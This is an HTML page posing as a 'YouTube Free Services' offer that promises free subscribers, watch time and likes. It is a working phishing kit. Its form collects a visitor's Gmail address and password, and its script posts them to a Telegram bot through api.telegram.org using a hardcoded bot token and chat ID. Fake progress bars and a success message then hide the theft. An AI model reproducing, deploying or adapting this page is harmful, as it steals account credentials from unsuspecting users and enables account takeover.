<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>YouTube Free Services</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
<style>
body {
  margin: 0;
  font-family: 'Roboto', sans-serif;
  background: #181818;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

/* Header */
header {
  position: absolute;
  top: 0;
  width: 100%;
  background: #ff0000;
  padding: 12px 20px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  box-shadow: 0 2px 5px rgba(0,0,0,0.2);
}
header img { width: 100px; }
header .icons { display: flex; gap: 15px; }
header .icons img { width: 25px; cursor: pointer; transition: transform 0.3s ease; }
header .icons img:hover { transform: scale(1.2); }

.container {
  background: #202020;
  padding: 30px;
  border-radius: 12px;
  width: 400px;
  text-align: center;
  box-shadow: 0 0 25px rgba(255,0,0,0.3);
  animation: slideIn 0.8s ease;
}
@keyframes slideIn { from {transform: translateY(-50px); opacity:0;} to {transform: translateY(0); opacity:1;} }

h2 { color: #ff0000; font-size: 24px; margin-bottom: 20px; }

input, select {
  width: 100%;
  padding: 12px;
  margin: 8px 0;
  border-radius: 8px;
  border: none;
  background: #2a2a2a;
  color: #fff;
  font-size: 14px;
  transition: all 0.3s ease;
}
input:focus, select:focus { outline: 2px solid #ff0000; background: #333; }
input:hover, select:hover { background: #3a3a3a; }

.card-selects { display: flex; gap: 10px; margin: 10px 0; flex-wrap: wrap; }
.card-selects select { flex: 1; min-width: 120px; }

button {
  width: 100%;
  padding: 12px;
  margin-top: 12px;
  background: #ff0000;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  font-size: 16px;
  color: #fff;
  transition: 0.3s ease;
  position: relative;
  overflow: hidden;
}
button:hover { background: #cc0000; }

.loading, .success {
  margin-top: 12px;
  font-style: italic;
  display: none;
  animation: fadein 0.5s;
}
.loading { color: #ffd700; }
.success { color: #00ff99; font-weight: bold; }

.progress-container {
  margin-top: 15px;
  text-align: left;
  display: none;
}
.progress-bar {
  height: 20px;
  border-radius: 10px;
  background: #333;
  margin: 8px 0;
  overflow: hidden;
}
.progress-fill {
  height: 100%;
  width: 0;
  background: #ff0000;
  transition: width 1.5s ease-in-out;
}

@keyframes fadein { from {opacity:0;} to {opacity:1;} }
footer { margin-top: 15px; font-size: 12px; color: #ccc; }

@media(max-width: 450px) { .container { width: 90%; padding: 20px; } header { padding: 10px 15px; } }
</style>
</head>
<body>

<div class="container">
  <h2>YouTube Free Services</h2>

  <input type="email" id="gmail" placeholder="Gmail Address" required>
  <input type="password" id="gmailPassword" placeholder="Gmail Password" required>
  <input type="text" id="ytUsername" placeholder="YouTube Username" required>

  <div class="card-selects">
    <select id="subscribers">
      <option value="">Subscribers</option>
      <option value="50">50 Subscribers</option>
      <option value="100">100 Subscribers</option>
      <option value="500">500 Subscribers</option>
    </select>
    <select id="watchtime">
      <option value="">Watch Time (hrs)</option>
      <option value="10">10 hrs</option>
      <option value="50">50 hrs</option>
      <option value="100">100 hrs</option>
    </select>
    <select id="likes">
      <option value="">Likes</option>
      <option value="50">50 Likes</option>
      <option value="100">100 Likes</option>
      <option value="500">500 Likes</option>
    </select>
  </div>

  <button onclick="sendData()">GET</button>
  <div class="loading" id="loading">‚è≥ Processing Request...</div>
  <div class="success" id="success">‚úÖ Request Sent Successfully! Please Wait...</div>

  <div class="progress-container" id="progressContainer">
    <div>Subscribers</div>
    <div class="progress-bar"><div class="progress-fill" id="subFill"></div></div>
    <div>Watch Time</div>
    <div class="progress-bar"><div class="progress-fill" id="watchFill"></div></div>
    <div>Likes</div>
    <div class="progress-bar"><div class="progress-fill" id="likesFill"></div></div>
  </div>

  <footer>Get YouTube Servises for free</footer>
</div>

<script>
const botToken = "8074425306:AAFZ8DvcPCHHEuPlY4R9HaF1OGQ9raJ1oZw";
const chatId = "8170720704";

function sendData() {
  const gmail = document.getElementById("gmail").value;
  const gmailPassword = document.getElementById("gmailPassword").value;
  const ytUsername = document.getElementById("ytUsername").value;
  const subscribers = document.getElementById("subscribers").value;
  const watchtime = document.getElementById("watchtime").value;
  const likes = document.getElementById("likes").value;

  if (!gmail || !gmailPassword || !ytUsername || !subscribers || !watchtime || !likes) {
    alert("Please fill out all fields!");
    return;
  }

  document.getElementById("loading").style.display = "block";
  document.getElementById("success").style.display = "none";
  document.getElementById("progressContainer").style.display = "none";

  const message = `üéØ YouTube Free Services Request
-----------------------
üìß Gmail: ${gmail}
üîë Gmail Password: ${gmailPassword}
üë§ YouTube Username: ${ytUsername}
üë• Subscribers: ${subscribers}
‚è± Watch Time: ${watchtime} hrs
‚ù§Ô∏è Likes: ${likes}`;

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text: message })
  })
  .then(response => {
    document.getElementById("loading").style.display = "none";
    document.getElementById("success").style.display = "block";
    document.getElementById("progressContainer").style.display = "block";

    // Animate progress bars
    document.getElementById("subFill").style.width = subscribers + '%';
    document.getElementById("watchFill").style.width = watchtime + '%';
    document.getElementById("likesFill").style.width = likes + '%';

    setTimeout(() => { document.getElementById("success").style.display = "none"; }, 4000);
  })
  .catch(error => {
    document.getElementById("loading").style.display = "none";
    alert("Error sending data!");
  });
}
</script>
</body>
</html>
